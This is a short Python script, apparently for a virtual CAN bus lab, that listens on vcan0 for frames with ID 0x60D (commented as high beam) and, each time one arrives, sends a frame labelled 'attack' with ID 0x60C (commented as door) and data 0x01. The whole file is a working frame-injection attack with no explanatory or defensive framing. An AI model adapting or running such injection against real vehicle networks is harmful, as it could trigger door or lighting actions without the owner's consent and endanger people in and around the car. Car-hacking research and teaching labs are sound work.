import can

bus = can.interface.Bus(channel='vcan0', bustype='socketcan')

while True:
    msg = bus.recv()
    if msg.arbitration_id == 0x60D: #high beam
        attack = can.Message(arbitration_id=0x60C, #door
                             data=[0x01],
                             is_extended_id=False)
        bus.send(attack)
        print(hex(msg.arbitration_id))
